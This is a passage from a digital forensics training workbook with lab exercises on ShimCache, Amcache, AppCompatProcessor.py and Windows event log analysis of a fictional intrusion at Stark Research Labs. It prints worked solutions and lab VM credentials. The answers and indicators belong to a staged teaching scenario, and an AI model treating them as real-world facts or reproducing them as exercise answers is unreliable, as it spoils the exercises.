.

add them to your notes spreadsheet!)

8. O ptional Homework: Filter the ShimCache output for other indicators of compromise documented during previous exercises.
For each hit found, make sure to clear your ﬁlter and look around it for additional ﬁndings. What else is present in this
output?
________________________________________________________________
________________________________________________________________
Solution
• C:\Windows\System32\STUN.exe is present
• C:\Windows\PSSDNSVC.EXE can be found immediately above the ﬁle C:\EC2VMConversion\psshutdown.exe, further
reinforcing the idea it is related to the SysInternals tool PsShutdown. These entries are also the oldest in the database
(based on their Cache Entry Positions), which make them less likely to be related to the intrusion we are investigating
(notice how much further above all of the other ﬁndings were).
• A grouping of "recon" applications is present similar to that found during Prefetch examinations. where.exe, quser.exe,
ipconﬁg.exe, NETSTAT.exe and tasklist.exe can all be found in the output.

106

© 2023 SANS Institute

.

Investigating Amcache.hve
Amcache.hve often provides similar information to ShimCache, but also includes important artifacts like SHA-1 hashes of
executables and the ability to audit installed software and loaded drivers.
• Run the following command in an administrator command terminal:
amcacheparser -i -f E:\C\Windows\AppCompat\Programs\Amcache.hve --csv G:\Labs\execution --csvf amcache.csv

Each table within the Amcache hive will be parsed into a separate .CSV ﬁle. Use Timeline Explorer to open the following ﬁles from
the G:\Labs\execution folder:
• amcache_UnassociatedFileEntries.csv
• amcache_DriveBinaries.csv
• Filter for edgeupdater within the amcache_UnassociatedFileEntries.csv output. Copy the SHA1 cell contents by double-clicking
the cell, highlighting the data and pressing Ctrl-C (or right-clicking for the copy menu). Submit the hash to the online
VirusTotal database: https://www.virustotal.com/gui/home/search. What type of tool is EdgeUpdater.exe likely to be? (Note:
if VirusTotal cannot be reached, you can also determine the answer through a careful review of executable metadata present
in the Amcache entry for this ﬁle)
________________________________________________________________
Solution
• EdgeUpdater.exe is the freeware tool BrowsingHistoryView.exe. Now, even if it turns out to be impossible to recover

.

this ﬁle we can still research and understand its capabilities.

© 2023 SANS Institute

.

107

• Switch to the amcache_DriveBinaries.csv ﬁle. We will dive deeper into drivers during the memory forensics section of the
course because malicious drivers are often associated with some of the most sophisticated attacks seen in the wild. They can
be diﬃcult to analyze due to the sheer number present on the average system. You could use this output to look for drivers
that are known to be vulnerable or were loaded from unusual directories. Each entry also includes a SHA1 hash which can be
checked against known-good/bad databases. Drivers loaded in x64 systems should be digitally signed and the database also
maintains digital signature information that can be investigated. In short, this ﬁle is a wonderful place to audit loaded drivers
on the system.
Filter the Driver Signed column to only show unsigned drivers present. What drivers are not signed? Have we seen these
before?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• btha2dp.sys
• bthhfenum.sys
• bthmodem.sys
• These are the same drivers identiﬁed during the Autoruns persistence exercise. Everything about them, including their
hash values, appears to be legitimate. We believe they are signed using a different type of "catalog" signature that
many tools do not have the capability to take into account. Interestingly, even the Amcache database seems to be

.

missing this information!

Optional Homework: AppCompatProcessor.py -- Scaling ShimCache and Amcache.hve Investigations
This optional lab will take place in your 508 SIFT LINUX VM, so you will need to shift to that virtual machine.
Launch the 508 SIFT LINUX VM and log in.
• LOGIN = sansforensics
• PASSWORD = forensics
Open a new terminal if one is not present:

108

© 2023 SANS Institute

.

Elevate privileges, change directory to the /cases folder
sudo su

cd /cases

Note

.

It is recommended to work under a root context (sudo su) as some tools or plugins may not operate as expected without
elevated permissions.

Tip
This might be the ﬁrst time you are using the Linux VM for this class. If you have not already, please update your electronic
workbook to make sure you have the most up-to-date lab information.
If your classroom does not provide Internet access, this update will need to be performed outside of class. If there are
important corrections not available in the packaged version in the VM, your instructor will advise you of any necessary ﬁxes.
The electronic workbook site is stored locally in the VM so that it is always available. However, occasionally the course authors
will update the source content with minor ﬁxes, such as correcting typos or clarifying explanations. You can pull down any
available updates into the VM by running the following command in a bash terminal:
workbook-update

Creating the AppCompatProcessor.py Database

© 2023 SANS Institute

.

109

AppCompatProcessor.py is a feature rich toolset designed to perform scalable hunting of ShimCache and Amcache databases
over hundreds or thousands of systems. It has an impressive set of analysis modules which you will get to experience in this
optional lab. Our ﬁrst task will be to import our evidence ﬁles into a SQLite database. We collected

Amcache.hve and SYSTEM

registry hives from twenty user workstations within the SRL network (40 total items, one each of ShimCache and Amacache for
each system), located in a zip archive: /cases/precooked/appcompat/SRL_Shim_Amcache.zip . The tool can process evidence in zip
format, so you will see the command point directly at this archive during initial processing.
AppCompatProcessor.py ./database.db load /cases/precooked/appcompat/SRL_Shim_Amcache.zip

Expect to see some error messaging as loading occurs. When complete, the tool will show a count of Total hosts (unique
computers to analyze), Total instances (number of evidence ﬁles parsed), and Total entries (number of unique items extracted
from the ShimCache and Amcache databases).

Using RegEx to Search for Evil
First we will perform a search using the built-in regular expression ﬁle that comes with AppCompatProcessor.py. The name of the
ﬁle is /etc/AppCompatProcessor/AppCompatSearch.txt , and it is a robust collection of signatures designed to ﬁnd anomalies
within ShimCache and Amcache data sets. You can modify the ﬁle in the future if you would like to include your own signatures.
Search results are summarized to standard out with full results written into a ﬁle named Output.txt, containing one line for each

.

of the ﬁndings. This idea of writing out full results to Output.txt is common to multiple features present in the tool.
• Run a regular expression search across the loaded evidence and review the results.
AppCompatProcessor.py ./database.db search

Solution

In our dataset, there is evidence of many executions from network shares (the RegEx marks these “Exec from VFS”),
executions from the "systemproﬁle" folder (all of these are false positives), SDelete usage, and several instances of
svchost.exe present in unusual folders.

110

© 2023 SANS Institute

.

• Take a quick look at Output.txt to review the complete search results. Notice how each line begins with a label from the
regular expression used to ﬁnd the anomaly.
gedit Output.txt &

Solution

• There is a lot of noise in the Output.txt ﬁle, and zooming into speciﬁc indicators can make sure nothing is missed. Use the
grep command to narrow your focus to one regular expression type:
grep Known Output.txt

With 19 out of 20 systems reporting this ﬁnding, is this likely to be something related to attacker activity?

.

________________________________________________________________

© 2023 SANS Institute

.

111

Solution
While both the Windows\Temp folder and sdelete.exe are often abused, it seems unlikely an attacker would leave a copy of
their tool on nearly every workstation queried. It could be the world's noisiest attacker leaving behind tools everywhere, or a
more likely explanation could be this is an admin tool deployed to every workstation. We would need to get more

grep VFS Output.txt | grep -v \?

.

information to make a ﬁnal determination.

The virtual ﬁle system regular expression (regex) is looking for entries within ShimCache that contain Universal Naming
Convention (UNC) paths to remote machines, typically denoted by a double-backslash (\\). This regex has an issue in that it
also matches an alternative Windows naming scheme for local ﬁles (\?\C:). To remove uninteresting ﬁndings, this grep
statement ﬁlters for all "VFS" entries, while removing (grep -v) any lines that contain a question mark (?).
Which systems connected to dev01? What interesting ﬁles were present on dev01?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

112

© 2023 SANS Institute

.

Solution
• WKSTN05 and WKSTN01 both have connections to dev01 in their ShimCache/Amcache ﬁles
• We can identify several tools present in the interesting c$\Windows\Services folder:
• narrator.exe
• 7z_paf.exe
• werfault.exe
• EdgeUpdater.exe
• ServiceUpdater.exe
grep Missplaced Output.txt

Which systems appear to have svchost.exe in an unusual folder?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
Three different systems have references in their ShimCache/Amcache ﬁles for svchost.exe in unusual locations:
• WKSTN05
• WKSTN01

.

• RD01

Stack Analysis with AppCompatProcessor
Use the stack feature of AppCompatProcessor.py to perform least frequency of occurrence analysis on the ShimCache and
Amcache databases. Stacking can be performed for any ﬁeld in the database.
• Perform a stack on the FilePath column to ﬁnd and count every location where a ﬁle named svchost.exe is found.
AppCompatProcessor.py ./database.db stack "FilePath" "FileName LIKE '%svchost.exe'"

How many entries were found for the expected location for svchost.exe ? How many outliers were found in other folders?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

113

Solution
• c:\windows\system32\svchost.exe was found in 40 out of a total of 40 ShimCache and Amcache databases. This is
the expected location and is clearly present on every system queried.
• c:\windows\update\svchost.exe was found in two (2) entries
• \dev01.shieldbase.com\c$\Windows\Services\svchost.exe was also found only in two (2) entries. Least frequency
analysis tells us these last two locations are most likely to be malicious.

• Now perform a stack on the FileName column for any entries located in a folder named update. What ﬁle names in the output
are worth looking deeper into?
AppCompatProcessor.py ./database.db stack "FileName" "FilePath LIKE '%update'"

.

Hint
Pay attention to the Count column showing how often the items occurred in the databases.
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

114

© 2023 SANS Institute

.

Solution
• updater.exe (1 occurrence)
• werfault.exe (1 occurrence)
• svchost.exe (2 occurrences)
• narrator.exe (2 occurrences)
• serviceupdater.exe (2 occurrences)
• edgeupdater.exe (3 occurrences)

.

Use Temporal Execution Correlation to Find New Anomalies
Attacker activity and tools often group together in these databases. As an example, recall that ShimCache keeps items in the
order they were added to the database. The tcorr feature of AppCompatProcessor.py takes a known ﬁlename as input and
looks for other ﬁles in the dataset that are highly correlated to that ﬁle (regularly present or executed before or after the ﬁle across
many systems). This analysis can help ﬁnd new anomalies. It doesn't always strike gold, but can be an interesting way to discover
new information.
• Run a temporal execution correlation for the previously identiﬁed ﬁle, edgeupdater.exe . What other ﬁles identiﬁed could be
interesting to our investigation?
AppCompatProcessor.py ./database.db tcorr "edgeupdater.exe"

________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

115

Solution
• There appear to be a lot of normal executables in this output, but among the noise you will notice several previously
identiﬁed suspicious names and locations:
• werfault.exe
• ServiceUpdater.exe
• svchost.exe
• bhv.exe
• Update.exe and slack.exe identiﬁed on the 172.16.6.14 system could also be worth taking a closer look at, even
though Slack is known to store binaries in the AppData folder.
• There are also some other very interesting names in this list! You might need to look up some of these folder and
ﬁlenames in a baseline system to convince yourself that they are normal (or not).

Search ShimCache and Amcache for short executable names
You can also do some clever pivoting on the available data like looking for short ﬁlenames. To do this, use a

stack on the

FileName column for any entries less than eight characters (3 character ﬁlenames with extension, e.g. abc.exe). You will get false

.

positives here, but you also might ﬁnd something interesting!
AppCompatProcessor.py ./database.db stack "FileName" "length(filename)<8"

• Focus on the least frequently occurring ﬁlenames. Do you see any that are unusual or worth looking deeper into?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

116

© 2023 SANS Institute

.

Solution

• Use the fsearch command to identify the source database (affected computer) and full path of any hits you want to dive
deeper into:
AppCompatProcessor.py ./database.db fsearch FileName -f "arh.exe"

.

Solution

Lab Takeaways
Application execution artifacts provide an unparalleled capability for discovering attacker activity. However, artifact interpretation
can be complicated. Some examples:
• Each time an executable ﬁle is moved, modiﬁed or renamed on the system, it will be given a new entry in the ShimCache
database. It will not overwrite the previous entries on the system.
• On Win7+ systems, the last time of execution is not recorded in the ShimCache.
• A reboot is required for Shimcache entries in memory to sync to the SYSTEM hive ﬁle on disk, so data could be missing since
the last reboot. It is possible to collect ShimCache from memory (there is a Volatility project plugin to do so) and it might
contain additional executables not yet written into the SYSTEM hive ﬁle.
• Prefetch ﬁndings:
• PowerShell.exe and cmd.exe were heavily used on rd01

© 2023 SANS Institute

.

117

• PowerShell transcript residue indicates user accounts tdungan and wacsvc executed commands using the PowerShell
console.
• Several ﬁles and folders of interest were identiﬁed:
• \WINDOWS\UPDATE\WERFAULT.EXE
• \WINDOWS\UPDATE\DEV01.SHIELDBASE.COM.TXT
• \WINDOWS\UPDATE\DC01.SHIELDBASE.COM.TXT
• \WINDOWS\UPDATE\DATA.BAT
• \WINDOWS\UPDATE\RD02\DOCUMENTS
• \WINDOWS\UPDATE\RD03\DOCUMENTS
• \WINDOWS\UPDATE\RD04\DOCUMENTS
• \WINDOWS\UPDATE\RD04\DOCUMENTS\PROJECTS
• \WINDOWS\UPDATE\SRL-EYES-ONLY
• \WINDOWS\UPDATE\EDGEUPDATER.EXE
• \WINDOWS\UPDATE\EDGEUPDATER.CFG
• \WINDOWS\UPDATE\RD09-HISTORY.CSV
• \WINDOWS\UPDATE\RD03-HISTORY.CSV
• \WINDOWS\UPDATE\RD02-HISTORY.CSV
• \WINDOWS\UPDATE\RD04-HISTORY.CSV
• \WINDOWS\UPDATE\DC01.SHIELDBASE.COM.TXT

• C:\Windows\Update\svchost.exe

.

• ShimCache ﬁles and folders identiﬁed:

• C:\Windows\Update\werfault.exe
• C:\Windows\Update\rd01\EdgeUpdater.exe
• C:\Windows\Update\EdgeUpdater.exe
• C:\Users\wacsvc\Downloads\bhv.exe
• Potential lateral movement:
• \172.16.6.19\c$\Users\srogers\
• \172.16.6.14\c$\Users\nromanoff\
• Amcache.hve hash lookups indicated edgeupdater.exe is the freeware tool BrowsingHistoryView.exe
• AppCompatProcessor.py is a very powerful tool for performing application execution analysis at scale.

118

© 2023 SANS Institute

.

Tip
The information found in this exercise will be very valuable later when you investigate the rest of the Stark Research Labs
network. We highly recommend you treat this like a real investigation and document your ﬁndings as you progress through
each exercise! You will ﬁnd a notes template named IRSpreadsheet.xlsx in your Windows VM in the G:\ folder. The
information just discovered would ﬁt nicely in the Malware & Tools, HostBasedIndicators, and Compromised Hosts tabs of the

.

spreadsheet.

© 2023 SANS Institute

.

119

Lab 2.2: Tracking Credential Use with Event Log Explorer
Background
Event logs are critical because they can hold information available nowhere else on the system. In this lab, we will see how event
data can give us a more detailed view of what happened during a computer intrusion, speciﬁcally focusing on account usage.

Objectives
• Learn to ﬁlter and pivot on complex data with commercial event viewing software
• Identify suspicious local account usage
• Use logon types to identify interesting logon activity
• Proﬁle remote desktop (RDP) usage
• Audit accounts with administrator privileges

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics

.

2. Please ensure your evidence is mounted correctly at rd01-triage(E:)

120

© 2023 SANS Institute

.

If you do not see your evidence mounted, use Windows Explorer to browse to G:\SRL_Evidence\triage and double-click on
the ﬁle rd01-triage.vhdx . The image will automatically mount in your 508 Windows VM using the next available drive letter
(likely E: ). If your image does not mount as drive letter E: , you likely have another device (often USB) attached to your virtual
machine. Consider ﬁxing this, rebooting, and trying again. This lab assumes the triage image is mounted as E: .
3. Open the Event Log Explorer application in your Windows VM under the Event Logs Tools heading.

Warning
DO NOT update your copy of Event Log Explorer if prompted. Updating Event Log Explorer might take it to a version where
capabilities are signiﬁcantly restricted, making it impossible to complete this exercise. If you accidentally update, a copy
of the Event Log Explorer installer is available in your class dropbox, allowing you to reinstall the original version.

4. You might be prompted to select a licensing option (if not, move on to the next step). Select Continue Evaluation if it is

.

available, or alternatively, you can register for a free personal license by clicking Get FREE License Now.

© 2023 SANS Institute

.

121

.ir

hi

de

email address and country information.

01

• The Get FREE License Now link will take you to https://eventlogxp.com/free-personal.php, where you must submit an

122

© 2023 SANS Institute

.

.

• The license should be available immediately and can then be pasted into Event Log Explorer by selecting Enter license
key. If you like and use this tool for work, please support the creators by purchasing a full license.

© 2023 SANS Institute

.

123

5. Open the menu item File -> Preferences and select General. Update the Date format and Time format to match the

.

international ISO 8601 standard.

124

© 2023 SANS Institute

.

6. Open the menu item File -> Preferences and select Log Window Defaults. Select Display time in UTC.

hi

de

01

.ir

7. Use the menu item File -> Open Log File and the New API option to open up an event log:

© 2023 SANS Institute

.

125

.
• For convenience, important RD01 logs have been copied from the triage ﬁle to your Labs folder. Open the ﬁle Security.evtx
from the folder G:\Labs\event-logs

126

© 2023 SANS Institute

.

Tip
If someday in the future Event Log Explorer fails to open a log, try again with the "Direct" option. This option parses the
raw log and is highly tolerant of issues like log corruption.

8. You should have one tab open. If for some reason you do not see tabs, check that File -> Preferences -> General -> Tabbed

.

document interface is selected.

9. Event Log Explorer has very robust ﬁltering capabilities. You can ﬁlter by event ID, event type, description text, regular
expressions, date range, and much more. Be creative and do not forget to clear your ﬁlter after your query is complete (View ->
Clear Filter)!

© 2023 SANS Institute

.

127

10. Add custom column templates: Event Log Explorer provides the means to create new columns for extracting important ﬁelds
from event logs of interest. We have pre-built custom column templates available for use.

.

• To add custom columns, select your "Security.evtx" tab and then select View -> Custom Columns

128

© 2023 SANS Institute

.

• Select Load -> Load all columns (this requires clicking the arrow button next to "Load" and selecting "Load all columns"
from the dropdown menu -- see example below)

.

G:\Labs\event-logs\Event-Log-Explorer-Templates\ELEX-Security-Log-508-Custom-Columns_Any-

• Find the ﬁle
Language.ccols and select Open.

© 2023 SANS Institute

.

129

.

• Select OK

130

© 2023 SANS Institute

.

.
• You should now see new "custom" columns populated in the tool.

© 2023 SANS Institute

.

131

Tip
Custom columns can signiﬁcantly slow down Event Log Explorer. If you feel like the tool is too sluggish, you can
remove columns by right-clicking on a column heading and selecting "Conﬁgure Columns". This can also be useful to
limit visible columns if you are using a small monitor.

Once custom columns are loaded, make sure not to sort by column as it can take a very long time to complete. You
will notice in the lab we rely mostly upon ﬁltering, and not sorting, for this reason!

11. Add color-coding: Event Log Explorer has the means to color-code events by type and save your preferences for later use. We
have a color-coding template if you would like to try this feature.

Note
Color coding events is not important to the completion of this exercise. If you have problems seeing some colors, it is
probably best for you to skip this step. If you add color coding and later decide you do not like them, you can always come
back to this dialog and select Remove All.

.

• To add color-coding, choose View -> Color Coding.

132

© 2023 SANS Institute

.

Color-Coding.ecc

.

• Click "Load..." and point the dialog to the ﬁle G:\Labs\event-logs\Event-Log-Explorer-Templates\ELEX-Security-Log-

© 2023 SANS Institute

.

133

• Click "Close"

Note
THIS DATA WILL BE USEFUL TO REFERENCE IN MULTIPLE UPCOMING LABS, SO DO NOT CLOSE AT THE END OF THIS LAB.

Lab Questions

.

Before you get started: Event Log analysis can be an arduous and diﬃcult task. The sheer number of different events and sparse
documentation combine to make some parts of the log nearly unintelligible. DO NOT attempt to understand and explain every event
you see. Even veteran Windows system administrators have diﬃculties explaining many combinations of events. Instead, focus on the
scenarios and events discussed in your course slides and use event logs to identify anomalies and answer targeted questions.
Security Log -- Successful Logons
1. Sort the log by the Date column. What date/time range is represented in this Security log?
________________________________________________________________
Solution
2022-08-31 17:36:13 to 2023-01-25 17:19:22

Tip
Documenting the time range available in logs being analyzed is an excellent habit. Many hours have been wasted by
analysts reviewing logs not containing the time range of activity they were looking for!

134

© 2023 SANS Institute

.

2. With nearly every activity in Windows tied to an account, the Security log is routinely used to track account usage. As
background knowledge, Stark Research Labs (SRL) has several important accounts in use:
• Srl.admin (Domain Administrator)
• SRLAdmin (Local Administrator and Helpdesk account)
• rsydow-a (Domain Administrator)
• cbarton-a (Domain Administrator)
• tdungan (User account assigned to workstation RD01)
Filter the Security log to audit successful logons from the system owner (4624 events for user tdungan). This can give us a

.

good baseline of normal activity on the system. Set up your ﬁlter like this:

What are the most common Logon Types for this user? (Hint: You should have a Custom Column for 4624 events)
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

135

Solution
Logon Type 3 (Network Logon) and Type 10 (Remote Interactive Logon) are the most common logon types for this user.
Work from home is very common in Stark Research Labs and employees have VPN access allowing them to RDP to their
internal workstations. Notice how multiple Logon Type 3 entries precede each Logon Type 10 (RDP) entry. This is caused
by the RDP Network Level Authentication security setting which ﬁrst requires a successful network authentication before
allowing a session to be initiated with the RDP server (to make RDP attacks more diﬃcult). If you review the Source
Network Address information for these logons you will see IP addresses in the 172.16.30.0/24 range, which you can verify
on the SRL network map as coming from the VPN network.

Take another look at the Logon Types for user tdungan. Which Logon Type seems a bit unusual for this user?

.

________________________________________________________________

136

© 2023 SANS Institute

.

Solution
Logon Type 9 (Different credentials used than the currently logged in user — RunAs) seems out of place. Depending on the
environment, it could be uncommon for regular users to switch credentials as most users only have one account. As a
counter-point, in some networks you might see these events when an application switches from the user account to
something like a Microsoft cloud account necessary to authenticate to cloud applications. However, in those situations
you would see frequent use of the cloud account and in this case, Logon Type 9 activity appears to only be present on two
days (2023-01-25 and 2023-01-23). We will document this anomaly now and dig deeper into it in the next exercise.

3. Now review successful logons (EID 4624) for the administrative account rsydow-a. What is the primary Logon Type for this

.

user?

________________________________________________________________

© 2023 SANS Institute

.

137

Solution
Logon Type 3 (Network Logon) is the only type recorded for account rsydow-a. This could be consistent for administrator
access to a workstation when it is only used to audit the system, run updates, etc. Every network is different and after
reviewing a few systems you will quickly understand what is normal for a given network.

Review the Logon Source (Source Network Address) for the various rsydow-a authentication events and document the IP
Address/Hostname information. These are the systems from where the connections originated. Which system seems
potentially unusual as an origination system for an administrator account?
________________________________________________________________
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

138

© 2023 SANS Institute

.

Solution
• 172.16.4.4 (DC01)
• 172.16.4.7 (WAC01)
• 172.16.6.18 (RD08)
• The 172.16.4.0/24 network is the Server IP range at SRL. 172.16.6.0/24 is a user workstation subnet (the same subnet
where RD01 resides). While anything is possible on a network, workstation to workstation connections are generally
more rare than workstation to server connections. As an example, doesn't it seem unusual for a workstation to need to
map a share (Logon Type 3) to another workstation? For this reason, RD08 seems to be the most unusual origination
system.
• Do you already have RD08 in your notes as a system of interest? Make sure to keep referencing your notes from
previous exercises so you can recall items of interest. Forensics is like putting together a puzzle and if a particular

.

puzzle piece keeps surfacing, you often know you are looking in the correct area.

4. Let's gather more information on an IP address of interest. Change your ﬁlter to see successful logons (EID 4624) containing
IP address 172.16.6.18.

Which accounts have authenticated to RD01 from 172.16.6.18?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

139

________________________________________________________________
Solution
• wacsvc
• slevine
• rsydow-a
• This is a great example of pivoting on one piece of data to gain more information. If it is strange for rsydow-a to
authenticate from 172.16.6.18, it stands to reason any other accounts doing it should also be held to the same
standard. Notice the Logon Type 10 for the wacsvc account. It is even more unusual to see two workstations using

.

remote desktop (Logon Type 10) between each other!

Document the general date and time ranges of the unusual network connections from rsydow-a. Look for a pattern in the
data. Can you derive any information from the authentication times?
________________________________________________________________
________________________________________________________________
________________________________________________________________

140

© 2023 SANS Institute

.

Solution
• 2023-01-17 15:43:32 to 2023-01-17 19:01:34
• 2023-01-16 17:01:03 to 2023-01-16 22:55:42
• A majority of the connections (81) occur within approximately 3.5 minutes on 2023-01-16. Activity this rapid typically
indicates scripted actions.

.

5. Take the information just gained and now ﬁlter for successful authentication events (EID 4624) for wacsvc.

Has this account authenticated from any remote systems other than the one just seen? What type of connections came from
this new IP address?
________________________________________________________________

© 2023 SANS Institute

.

141

Solution
• 172.16.4.9
• Most connections appear to have originated from 172.16.6.18, but two Logon Type 10 (RDP) events originated from
172.16.4.9 (interestingly, the event log recorded the wrong hostname for this IP)
• Also notice multiple tdungan events are returned from this ﬁlter. If you review the Description information for these
events you will see they refer to "runas" events where the currently logged in account (tdungan in this case) is
authenticating with a different set of credentials (wacsvc). Very interesting, and something we will cover more deeply
in the next section!

6. Finally, review successful authentication events (EID 4624) for the previously discovered slevine account.

.

How many successful authentications on RD01 were accomplished by user account slevine?
________________________________________________________________
Solution
• The logs hold only a single successful logon for slevine on 2023-01-25 14:26:57
• The connection was a Logon Type 3 (Network Logon) from 172.16.6.18

Security Log -- RDP Profiling
We have already documented RDP activity (4624 Logon Type 10 events). Now let us look for additional information on these
connections by ﬁltering for event ID 4778, session reconnect events.

142

© 2023 SANS Institute

.

Users in the SRL network often telecommute and are allowed to RDP to their workstations through a VPN connection. The normal
baseline behavior for this activity should show the user's domain account authenticated from the VPN concentrator network.
tdungan is the owner of this workstation and the client VPN network uses IP addresses in the range of 172.16.30.0/24.

Clear your ﬁlter, and re-ﬁlter the Security log for event ID 4778. Look for any abnormal activity. (Hint: You do not have a custom
column created for these events, so you will need to iterate through the small number of items in the ﬁltered output).
1. What is the Client Name of the system used to authenticate via the tdungan account (likely his home computer hostname)?
________________________________________________________________
Solution

.

DUNGANATOR

2. What suspicious account is recorded in RDP session reconnect events?
________________________________________________________________
Solution
The wacsvc account is present in several events.
3. On what days did the suspicious connections occur?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

143

Solution
• 2023-01-18
• 2023-01-19

4. What Client Name was in use for these connections?
________________________________________________________________
Solution

.

The client name for all wacsvc logons is phoenix.

5. What Client IP Address is present in these suspicious events? Does the IP address appear to originate from the VPN IP range?
________________________________________________________________

144

© 2023 SANS Institute

.

Solution
• 172.16.6.18 (RD08)
• No, this is not from the VPN IP range (172.16.30.0/24)

6. Use the menu item File -> Open Log File and the New API option to open up the TerminalServices-RDPClient log:
• Open the ﬁle Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx from the folder G:\Labs\event-logs
• Recall that this log is different from most in that it records outbound instead of inbound connections. Document the time
and destination of any outbound RDP activity:

.

________________________________________________________________

© 2023 SANS Institute

.

145

Solution
The TerminalServices-RDPClient log contains evidence of one outbound connection to 172.16.4.9 (DEV01) on 2023-01-18
14:55:12

.

• C hallenge: Can you determine what user account initiated the connection?

146

© 2023 SANS Institute

.

Solution
• Perhaps the easiest and most reliable way to identify the user involved is to notice the outbound connection event is
tagged with a user SID. Searching for that SID within the Security.evtx log will lead you to the username. You could
also simply look for authentication events in the Security log near the time of the connection.

.

• S-1-5-21-2838623409-1327563992-2591358621-1220 (wacsvc)

Security Log -- Local Account Auditing
Return back to the Security.evtx log, clear any existing ﬁlters, and create a new ﬁlter to look for EID 4776 Account Logon
authentication events. Recall that these events identify local accounts authenticated by the system (as opposed to domain
accounts which are authenticated at the domain controller). These events are often rare on workstations within an enterprise.

© 2023 SANS Institute

.

147

1. Are there any successful authentications for local accounts? (Hint: you should have a custom column for 4776 events)
________________________________________________________________
Solution
The srladmin account successfully authenticated to the system on 2022-10-21 16:38:27. This is the local administrator

.

account at SRL used for helpdesk activities.

2. C hallenge: What other account attempted local authentications on his system? Do the time periods of activity correlate with
other suspicious activity observed? (Hint: You will need to add additional logon events to your ﬁlter to see the correlation.)
________________________________________________________________
________________________________________________________________

148

© 2023 SANS Institute

.

Solution
• Multiple failure events were recorded for the account sprx. There were no successful logons for this account.
• The failed logon attempts by sprx often correlate to suspicious inbound RDP activity by the wacsvc account (EID 4778
and 4624 Type 10). It is possible that an application running on the attacker's system attempted to authenticate
during the times they were connected to RD01 via RDP. These authentication requests could have been proxied to
RD01 where they failed because the sprx account does not exist in SRL. If this is the case, these events could be leaking
the attacker's user name from their personal system! This could turn out to be a unique indicator of compromise useful
for identifying attacker activity elsewhere in the network.

.

Optional Homework: Auditing Admin Account Activity

We do not yet know the level of permissions for the suspicious wacsvc account. A quick check for administrative rights can be
accomplished by looking for 4672 events corresponding with account logons. If a 4672 event exists for a given account, the
a ccount has permissions consistent with the administrators group.
Clear your existing ﬁlter and ﬁlter the Security log for 4672 events with the string wacsvc in the "Text in description" ﬁeld.

1. How many 4672 events were recorded for the wacsvc account?
________________________________________________________________

© 2023 SANS Institute

.

149

Solution
There are 9 EID 4672 events present for the wacsvc account indicating the account has some degree of administrative
rights.
2. If the use of administrative accounts is relatively rare in the enterprise, event ID 4672 can be used to identify accounts being
used in suspicious ways. As an example, certain admin accounts may only be designated for server administration. If you see
such an account logging into a workstation, that can be a clue of misuse.
• To use this event effectively, we want to focus on the user accounts having administrative privileges and ignore any builtin Windows accounts (which often have high-level privileges and authenticate frequently). One way to do this is to ﬁlter on
a part of the account security identiﬁer (SID) that Windows built-in accounts do not have, notably the Unique Domain
Identiﬁer portion of the account SID.

.ir

Windows built-in accounts are not domain accounts, and hence they do not include the Unique Domain Identiﬁer or Relative
Identiﬁer part of the SID that an ordinary user account would have. As an example, let's compare the Security IDs (SIDs) for a

hi

de

01

built-in account (SYSTEM) and a domain account (tdungan) in the SRL network:

By including a portion of the Unique Domain Identiﬁer in our event log ﬁlter, we can focus on the domain accounts, which are
far more likely to help us to identify account abuse. Clear your existing ﬁlter and ﬁlter for 4672 events with the (partial) Unique
Domain Identiﬁer string 2838623409 in the "Text in description" ﬁeld.

150

© 2023 SANS Institute

.

• There are hundreds of administrator authentications on this system, but using the custom column for 4672 events
makes it feasible to quickly audit them. What domain accounts have authenticated to this system with admin-level
privileges?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• cbarton-a
• rsydow-a
• wacsvc

.

Note that this would have been yet another way that we could have identiﬁed the suspicious wacsvc account!

Lab Takeaways
• Suspicious activity was identiﬁed in the logs between 2023-01-16 and 2023-01-25
• There were several suspicious and potentially compromised accounts identiﬁed:
• tdungan (Logon Type 9)
• wacsvc (Logon Type 3 & 10)
• rsydow-a (Logon Type 3)
• slevine (Logon Type 3)

© 2023 SANS Institute

.

151

• sprx (Failed local authentication)
• Multiple suspicious inbound connections from 172.16.6.18 (RD08) were discovered
• Two inbound Logon Type 10 (RDP) events originated from 172.16.4.9 (DEV01) on 2023-01-23 using wacsvc account
• One outbound RDP connection was initiated to 172.16.4.9 (DEV01) on 2023-01-18 using wacsvc account
• It would be useful to look for additional references in our network for the client name phoenix, found in the RDP session

.

connect events.

152

© 2023 SANS Institute

.

Lab 2.3: Tracking Lateral Movement with EvtxECmd
Background
Eric Zimmerman has done it again! EvtxECmd is an amazing tool designed to facilitate event log analysis. Event logs are critical
because they often hold information available nowhere else on the system. With this lab, we will see that effect in action as we get
a more detailed view of what happened during a computer intrusion, speciﬁcally focusing on lateral movement detection. While
we will be analyzing events from a single system, keep in mind you can also use this tool to perform similar analysis across
several systems at once, helping to scale your efforts.

Objectives
• Learn to analyze and ﬁlter logs with EvtxECmd
• Identify the use of administrative shares, a common lateral movement technique
• Search for interesting "RunAs" or explicit credential use on the system
• Audit scheduled tasks using the Task Scheduler log
• Review new Windows services to identify remote code execution and persistence

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.

• PASSWORD = forensics

.

• LOGIN = SANSDFIR

2. Please ensure your evidence is mounted correctly at rd01-triage(E:)

© 2023 SANS Institute

.

153

If you do not see your evidence mounted, use Windows Explorer to browse to G:\SRL_Evidence\triage and double-click on
the ﬁle rd01-triage.vhdx . The image will automatically mount in your 508 Windows VM using the next available drive letter
(likely E: ). If your image does not mount as drive letter E: , you likely have another device (often USB) attached to your virtual
machine. Consider ﬁxing this, rebooting, and trying again. This lab assumes the triage image is mounted as E: .
